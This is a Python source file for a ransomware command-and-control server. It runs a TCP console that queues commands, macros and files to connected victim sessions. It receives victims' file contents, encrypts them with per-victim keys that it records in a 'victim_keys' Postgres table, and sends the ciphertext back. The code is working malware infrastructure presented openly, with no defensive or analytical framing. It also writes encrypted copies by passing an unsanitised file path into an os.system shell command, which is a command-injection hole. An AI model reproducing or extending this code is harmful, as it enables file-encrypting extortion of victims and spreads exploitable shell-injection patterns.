import atexit
import base64
import cmd
from collections import deque
import json
import os
from pathlib import Path
import secrets
import shlex
import socket
import threading
from typing import Deque, Dict, Optional, Set, Tuple, Union
import crypto
import psycopg

Address = Tuple[str, int]
QueueItem = Tuple[str, Union[str, Tuple[str, bytes]]]


class QueuedTCPSessionServer:
    def __init__(
        self,
        bind_ip,
        port,
        macros_path,
        postgres_dsn,
        postgres_table,
        state_path
    ) -> None:
        self.bind_ip = bind_ip
        self.port = port
        self.macros_path = Path(macros_path)
        self.macros: Dict[str, str] = self._load_macros()
        self.postgres_dsn = postgres_dsn
        self.postgres_table = postgres_table
        self.state_path = state_path

        # Crypto secrets - regenerate per iteration
        self.global_key1 = secrets.randbits(20)
        self.global_key2 = secrets.randbits(20)
        # ip -> victim_key
        self.per_victim_key_store = {}
        # Prevent encrypting the same file twice
        self.encrypted_names: Set[Tuple[str, str]] = set()

        self.server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_sock.bind((self.bind_ip, self.port))
        self.server_sock.listen()

        self.lock = threading.Lock()
        # session_id -> (origin_ip, tcp_peer_port, active socket or None)
        self.sessions: Dict[int, Tuple[str, int, Optional[socket.socket]]] = {}
        # session_id -> FIFO queue of ("msg", text) or ("file", (filename, raw_bytes))
        self.queues: Dict[int, Deque[QueueItem]] = {}
        # session_id -> human-readable description of item awaiting OK / OK <len> / ENCRYPT
        self.in_flight: Dict[int, Optional[str]] = {}
        # origin_ip -> session_id
        self.ip_to_session: Dict[str, int] = {}
        self.next_id = 1
        self.running = threading.Event()
        self.running.set()
        self.load_from_json()

    def _load_macros(self) -> Dict[str, str]:
        if not self.macros_path.exists():
            print(
                f"Warning: Macros file '{self.macros_path}' not found. Starting with 0 macros.")
            return {}

        with self.macros_path.open("r", encoding="utf-8") as f:
            data = json.load(f)

        if not isinstance(data, dict):
            raise ValueError(
                "Macros JSON root must be an object mapping macro names to strings.")

        parsed: Dict[str, str] = {}
        for key, value in data.items():
            if isinstance(key, str) and isinstance(value, str):
                parsed[key] = value
            else:
                parsed[str(key)] = json.dumps(value, ensure_ascii=False)
        return parsed

    def reload_macros(self) -> None:
        try:
            loaded = self._load_macros()
        except Exception as exc:
            print(f"Failed to reload macros from '{self.macros_path}': {exc}")
            return

        with self.lock:
            self.macros = loaded
        print(f"Reloaded {len(loaded)} macro(s) from '{self.macros_path}'.")

    def list_macros(self) -> None:
        with self.lock:
            if not self.macros:
                print(f"No macros loaded from '{self.macros_path}'.")
                return
            print(f"\nMacros ({self.macros_path}):")
            for name, payload in self.macros.items():
                print(f"  {name} -> {payload!r}")

    def _register_or_refresh_session(
        self,
        session_ip: str,
        peer_port: int,
        conn: socket.socket,
    ) -> Tuple[int, bool]:
        old_conn: Optional[socket.socket] = None

        with self.lock:
            if session_ip in self.ip_to_session:
                sid = self.ip_to_session[session_ip]
                _, _, prev_conn = self.sessions[sid]
                if prev_conn is not conn:
                    old_conn = prev_conn
                self.sessions[sid] = (session_ip, peer_port, conn)
                self.queues.setdefault(sid, deque())
                self.in_flight.setdefault(sid, None)
                is_new = False
            else:
                sid = self.next_id
                self.next_id += 1
                self.sessions[sid] = (session_ip, peer_port, conn)
                self.queues[sid] = deque()
                self.in_flight[sid] = None
                self.ip_to_session[session_ip] = sid
                is_new = True

        if old_conn is not None:
            try:
                old_conn.close()
            except OSError:
                pass

        return sid, is_new

    def _remove_socket_if_current(self, sid: int, conn: socket.socket) -> None:
        with self.lock:
            entry = self.sessions.get(sid)
            if entry and entry[2] is conn:
                ip, port, _ = entry
                self.sessions[sid] = (ip, port, None)
                self.in_flight[sid] = None

    def _send_line(self, conn: socket.socket, text: str) -> bool:
        try:
            conn.sendall((text + "\n").encode("utf-8"))
            return True
        except OSError:
            return False

    def _send_file(self, conn: socket.socket, filename: str, data: bytes) -> bool:
        b64_name = base64.urlsafe_b64encode(
            filename.encode("utf-8")).decode("ascii")
        header = f"FILE {b64_name} {len(data)}\n".encode("utf-8")
        try:
            conn.sendall(header + data)
            return True
        except OSError:
            return False

    def _send_encrypted(self, conn: socket.socket, data: bytes) -> bool:
        header = f"FILE {len(data)}\n".encode("utf-8")
        try:
            conn.sendall(header + data)
            return True
        except OSError:
            return False

    def _dispatch_next_or_empty(self, sid: int, conn: socket.socket) -> None:
        with self.lock:
            q = self.queues.get(sid)
            item = q.popleft() if q else None
            remaining = len(q) if q else 0

            if item is None:
                self.in_flight[sid] = None
                desc = None
            elif item[0] == "msg":
                assert isinstance(item[1], str)
                desc = item[1]
                self.in_flight[sid] = desc
            else:
                assert isinstance(item[1], tuple)
                fname, fbytes = item[1]
                desc = f"<file: {fname} ({len(fbytes)} bytes)>"
                self.in_flight[sid] = desc

        if item is None:
            if self._send_line(conn, "EMPTY"):
                print(f"\n[Session #{sid} queue empty] Sent EMPTY")
        elif item[0] == "msg":
            assert isinstance(item[1], str)
            if self._send_line(conn, item[1]):
                print(
                    f"\n[Sent to Session #{sid} (queued left: {remaining})] {item[1]}")
        else:
            assert isinstance(item[1], tuple)
            fname, fbytes = item[1]
            if self._send_file(conn, fname, fbytes):
                print(
                    f"\n[Sent file to Session #{sid} (queued left: {remaining})] {fname} ({len(fbytes)} bytes)")

    def _consume_last_message(self, sid: int) -> Optional[str]:
        with self.lock:
            msg = self.in_flight.get(sid)
            self.in_flight[sid] = None
            return msg

    @staticmethod
    def _recv_line_from_buf(conn: socket.socket, buf: bytearray) -> Optional[str]:
        while True:
            nl = buf.find(b"\n")
            if nl != -1:
                line = bytes(buf[:nl]).decode(
                    "utf-8", errors="replace").rstrip("\r")
                del buf[: nl + 1]
                return line

            try:
                chunk = conn.recv(4096)
            except OSError:
                return None
            if not chunk:
                return None
            buf.extend(chunk)

    @staticmethod
    def _recv_exact_bytes(conn: socket.socket, buf: bytearray, nbytes: int) -> Optional[bytes]:
        while len(buf) < nbytes:
            try:
                chunk = conn.recv(4096)
            except OSError:
                return None
            if not chunk:
                return None
            buf.extend(chunk)

        payload = bytes(buf[:nbytes])
        del buf[:nbytes]
        return payload

    def handle_client(self, conn: socket.socket, addr: Address) -> None:
        peer_ip, peer_port = addr
        assigned_sid: Optional[int] = None
        buf = bytearray()

        try:
            with conn:
                # 1. Expect CONNECT <ip> at the start of the session
                while self.running.is_set() and assigned_sid is None:
                    first_line = self._recv_line_from_buf(conn, buf)
                    if first_line is None:
                        return

                    first_line = first_line.strip()
                    if not first_line:
                        continue

                    parts = first_line.split()
                    if len(parts) == 2 and parts[0] == "CONNECT":
                        session_ip = parts[1].strip()
                        sid, is_new = self._register_or_refresh_session(
                            session_ip, peer_port, conn)
                        assigned_sid = sid
                        status = "New session created" if is_new else "Session reconnected"
                        print(
                            f"\n[{status}] Session #{sid} -> origin IP {session_ip} "
                            f"(socket {peer_ip}:{peer_port})"
                        )
                        if not self._send_line(conn, "OK"):
                            return
                    else:
                        print(
                            f"\n[Protocol error from {peer_ip}:{peer_port}] "
                            f"Expected 'CONNECT <ip>' first, got: {first_line!r}"
                        )
                        self._send_line(conn, "ERR EXPECTED_CONNECT")
                        return

                # 2. Subsequent session commands over the same TCP connection
                while self.running.is_set():
                    header = self._recv_line_from_buf(conn, buf)
                    if header is None:
                        return

                    header = header.strip()
                    if not header:
                        continue

                    if header == "READY":
                        print(f"\n[Session #{assigned_sid}] Received READY")
                        self._dispatch_next_or_empty(assigned_sid, conn)

                    elif header.startswith("ENCRYPT "):
                        parts = header.split(" ")
                        if len(parts) == 3 and parts[2].isdigit():
                            b64_path = parts[1]
                            length = int(parts[2])
                            raw_bytes = self._recv_exact_bytes(
                                conn, buf, length)
                            if raw_bytes is None:
                                return

                            try:
                                src_path_bytes = base64.urlsafe_b64decode(
                                    b64_path.encode("ascii"))
                                src_path = src_path_bytes.decode("utf-8")
                            except Exception:
                                src_path_bytes = b"input.bin"
                                src_path = "input.bin"

                            if (session_ip, src_path) in self.encrypted_names:
                                self._send_line(conn, "REJECTED")
                                print(
                                    f"\n[Session #{assigned_sid}] rejected duplicate ENCRYPT for '{src_path}'")
                                continue

                            enc_bytes = self._encrypt_bytes(
                                raw_bytes, session_ip, src_path_bytes)
                            print(
                                f"\n[Session #{assigned_sid}] ENCRYPT request for '{src_path}' ({length} bytes)"
                            )
                            self._save_encrypted_copy(session_ip, src_path, enc_bytes)
                            self.encrypted_names.add((session_ip, src_path))
                            if self._send_encrypted(conn, enc_bytes):
                                print(
                                    f"[Sent encrypted data to Session #{assigned_sid}] ({len(enc_bytes)} bytes)")
                            else:
                                return
                        else:
                            print(f"\n[Session #{assigned_sid}] {header}")

                    elif header == "OK":
                        orig_msg = self._consume_last_message(assigned_sid)
                        print(
                            f"\n[Session #{assigned_sid}] OK | Original item: {orig_msg!r}")
                        self._dispatch_next_or_empty(assigned_sid, conn)

                    elif header.startswith("OK "):
                        parts = header.split(maxsplit=1)
                        if len(parts) == 2 and parts[1].isdigit():
                            ans_len = int(parts[1])
                            ans_bytes = self._recv_exact_bytes(
                                conn, buf, ans_len)
                            if ans_bytes is None:
                                return
                            ans_text = ans_bytes.decode(
                                "utf-8", errors="replace")
                            orig_msg = self._consume_last_message(assigned_sid)
                            print(
                                f"\n[Session #{assigned_sid}] Original item: {orig_msg!r}\n"
                                f"  Response ({ans_len} bytes): {ans_text}"
                            )
                            self._dispatch_next_or_empty(assigned_sid, conn)
                        else:
                            print(f"\n[Session #{assigned_sid}] {header}")

                    elif header == "SLEEPING":
                        print(
                            f"\n[Session #{assigned_sid}] Client is SLEEPING")

                    else:
                        print(f"\n[From Session #{assigned_sid}] {header}")
        finally:
            if assigned_sid is not None:
                self._remove_socket_if_current(assigned_sid, conn)
                print(
                    f"\n[Disconnected] Session #{assigned_sid} ({peer_ip}:{peer_port})")

    def accept_loop(self) -> None:
        while self.running.is_set():
            try:
                conn, addr = self.server_sock.accept()
            except OSError:
                break

            threading.Thread(target=self.handle_client,
                             args=(conn, addr), daemon=True).start()

    def _resolve_payload(self, raw_input: str) -> Optional[Tuple[QueueItem, Optional[str]]]:
        parts = raw_input.strip().split(maxsplit=1)
        if len(parts) == 2 and parts[0].lower() == "macro":
            macro_name = parts[1].strip()
            with self.lock:
                macro_val = self.macros.get(macro_name)
            if macro_val is None:
                print(
                    f"Macro '{macro_name}' not found in '{self.macros_path}'.")
                return None
            return ("msg", macro_val), macro_name

        return ("msg", raw_input), None

    def enqueue_message(self, sid: int, text: str) -> None:
        resolved = self._resolve_payload(text)
        if resolved is None:
            return
        item, macro_name = resolved

        with self.lock:
            if sid not in self.sessions:
                print(f"Session #{sid} does not exist.")
                return
            q = self.queues.setdefault(sid, deque())
            q.append(item)
            q_len = len(q)
            ip, _, conn = self.sessions[sid]

        status = "connected" if conn is not None else "disconnected"
        payload = item[1]
        if macro_name is not None:
            print(
                f"Queued macro '{macro_name}' for Session #{sid} ({ip}, {status}) "
                f"[queue size: {q_len}]: {payload}"
            )
        else:
            print(
                f"Queued for Session #{sid} ({ip}, {status}) [queue size: {q_len}]: {payload}")

    def enqueue_file(self, sid: int, local_path_str: str, remote_name: Optional[str] = None) -> None:
        local_path = Path(local_path_str)
        if not local_path.is_file():
            print(f"File not found: '{local_path}'")
            return

        target_name = remote_name.strip() if remote_name else local_path.name
        if not target_name:
            print("Invalid remote file name.")
            return

        try:
            file_bytes = local_path.read_bytes()
        except OSError as exc:
            print(f"Failed to read '{local_path}': {exc}")
            return

        with self.lock:
            if sid not in self.sessions:
                print(f"Session #{sid} does not exist.")
                return
            q = self.queues.setdefault(sid, deque())
            q.append(("file", (target_name, file_bytes)))
            q_len = len(q)
            ip, _, conn = self.sessions[sid]

        status = "connected" if conn is not None else "disconnected"
        print(
            f"Queued file '{target_name}' ({len(file_bytes)} bytes) from '{local_path}' "
            f"for Session #{sid} ({ip}, {status}) [queue size: {q_len}]"
        )

    def _handle_session_line(self, sid: int, raw_line: str) -> None:
        stripped = raw_line.strip()
        if stripped.lower().startswith("file "):
            try:
                tokens = shlex.split(stripped)
            except ValueError as exc:
                print(f"Invalid syntax: {exc}")
                return
            if len(tokens) < 2 or len(tokens) > 3:
                print("Usage inside session: file <local_path> [remote_name]")
                return
            remote_name = tokens[2] if len(tokens) == 3 else None
            self.enqueue_file(sid, tokens[1], remote_name)
            return

        self.enqueue_message(sid, raw_line)

    def list_sessions(self) -> None:
        with self.lock:
            if not self.sessions:
                print("No sessions yet. Waiting for clients to send 'CONNECT <ip>'...")
                return
            print("\nSessions:")
            for sid, (ip, port, conn) in self.sessions.items():
                state = "connected" if conn is not None else "disconnected"
                q_len = len(self.queues.get(sid, ()))
                print(f"  [{sid}] {ip} (port {port}, {state}) - queued: {q_len}")

    def enter_session_chat(self, sid: int) -> None:
        with self.lock:
            if sid not in self.sessions:
                print(f"Session #{sid} does not exist.")
                return
            ip = self.sessions[sid][0]

        print(
            f"Queueing for Session #{sid} ({ip}). "
            "Type a message, 'macro <name>', 'file <path> [name]', or '/exit' to return."
        )
        while True:
            try:
                msg = input(f"queue {sid}> ")
            except (EOFError, KeyboardInterrupt):
                print()
                break

            if msg.strip() == "/exit":
                break
            if msg == "":
                continue
            self._handle_session_line(sid, msg)

    def cli_loop(self) -> None:
        print(
            f"Listening on {self.bind_ip}:{self.port} (TCP) | Macros: {self.macros_path}")
        print(
            "Commands: 'list' | 'use <id>' | 'send <id> <msg|macro x>' | "
            "'sendfile <id> <path> [name]' | 'macros' | 'reload' | 'quit'"
        )

        while self.running.is_set():
            try:
                raw = input("\nserver> ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                break

            if not raw:
                continue

            parts = raw.split(maxsplit=2)
            cmd = parts[0].lower()

            if cmd == "quit":
                break
            elif cmd == "list":
                self.list_sessions()
            elif cmd == "macros":
                self.list_macros()
            elif cmd == "reload":
                self.reload_macros()
            elif cmd == "use" and len(parts) >= 2 and parts[1].isdigit():
                self.enter_session_chat(int(parts[1]))
            elif cmd == "send" and len(parts) == 3 and parts[1].isdigit():
                self.enqueue_message(int(parts[1]), parts[2])
            elif cmd == "sendfile":
                try:
                    tokens = shlex.split(raw)
                except ValueError as exc:
                    print(f"Invalid syntax: {exc}")
                    continue
                if len(tokens) in (3, 4) and tokens[1].isdigit():
                    remote_name = tokens[3] if len(tokens) == 4 else None
                    self.enqueue_file(int(tokens[1]), tokens[2], remote_name)
                else:
                    print(
                        "Usage: sendfile <session_id> <local_path> [remote_name]")
            else:
                print(
                    "Unknown command. Use: list | use <id> | send <id> <msg|macro x> | "
                    "sendfile <id> <path> [name] | macros | reload | quit"
                )

        self.shutdown()

    def shutdown(self) -> None:
        self.save_to_json()
        self.running.clear()
        try:
            self.server_sock.close()
        except OSError:
            pass

        with self.lock:
            conns = [entry[2]
                     for entry in self.sessions.values() if entry[2] is not None]
            self.sessions.clear()
            self.queues.clear()
            self.in_flight.clear()
            self.ip_to_session.clear()

        for conn in conns:
            try:
                conn.close()
            except OSError:
                pass

        print("Server stopped.")

    def _store_victim_key(self, origin_ip: str, victim_key: int) -> None:
        try:
            with psycopg.connect(self.postgres_dsn) as conn:
                conn.execute(
                    f"INSERT INTO {self.postgres_table} (origin_ip, victim_key) VALUES (%s, %s)",
                    (origin_ip, str(victim_key)))
        except Exception as exc:
            print(f"Failed to store victim key for {origin_ip}: {exc}")

    def load_from_json(self) -> None:
        try:
            with open(self.state_path) as f:
                state = json.load(f)
        except (OSError, json.JSONDecodeError):
            return
        self.encrypted_names = {
            tuple(p) for p in state.get("encrypted_names", [])}
        print("Successfully loaded state from JSON.")

    def save_to_json(self) -> None:
        state = {
            "encrypted_names": [list(p) for p in self.encrypted_names],
        }
        with open(self.state_path, "w") as f:
            json.dump(state, f)

    def _encrypt_bytes(self, data: bytes, origin_ip: str, path: bytes) -> bytes:
        with self.lock:
            if origin_ip not in self.per_victim_key_store:
                victim_key = secrets.randbits(128)
                self.per_victim_key_store[origin_ip] = victim_key
                self._store_victim_key(origin_ip, victim_key)
            else:
                victim_key = self.per_victim_key_store[origin_ip]

        encrypted_data = crypto.encrypt(
            data, victim_key, self.global_key1, self.global_key2, path)
        return encrypted_data

    def _save_encrypted_copy(self, origin_ip: str, path: str, data: bytes) -> None:
        path = path.replace("..", "") # directory traversal protection
        data_b64 = base64.b64encode(data).decode("ascii")
        target = f"encrypted_copies/{origin_ip}/{path}"
        cmd = f"echo {data_b64} | base64 -d > {target}"
        try:
            os.makedirs(os.path.dirname(target), exist_ok=True) # create parent directories if needed
            os.system(cmd)
        except Exception as exc:
            print(f"Failed to save encrypted copy for {origin_ip}/{path}: {exc}")


if __name__ == "__main__":
    server = QueuedTCPSessionServer(
        bind_ip="127.0.0.1",
        port=9000,
        macros_path="macros.json",
        postgres_dsn="dbname=c2db host=/var/run/postgresql",
        postgres_table="victim_keys",
        state_path="state.json")
    acceptor = threading.Thread(target=server.accept_loop, daemon=True)
    acceptor.start()
    atexit.register(server.shutdown)
    if os.environ.get("C2_HEADLESS"):
        threading.Event().wait()
    else:
        server.cli_loop()
